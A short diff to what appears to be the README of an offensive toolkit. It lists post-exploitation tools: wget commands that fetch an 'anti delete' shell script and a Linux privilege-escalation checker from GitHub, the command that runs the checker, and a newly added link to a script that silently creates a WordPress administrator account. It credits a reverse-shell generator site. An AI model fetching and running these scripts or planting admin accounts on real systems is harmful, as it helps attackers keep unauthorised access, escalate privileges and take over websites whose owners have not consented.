@@ -57,5 +57,5 @@ wget https://raw.githubusercontent.com/t101804/repshare/main/priv8_anti_delet.sh
 wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
 python linuxprivchecker.py -w -o linuxprivchecker.log
 ```
-- [auto-add-admin-user-to-wordpress]
+- [auto-add-admin-user-to-wordpress](https://github.com/t101804/repshare/blob/main/wp_add_admin.php)
 Credit by revshells.com and @CallMeRep
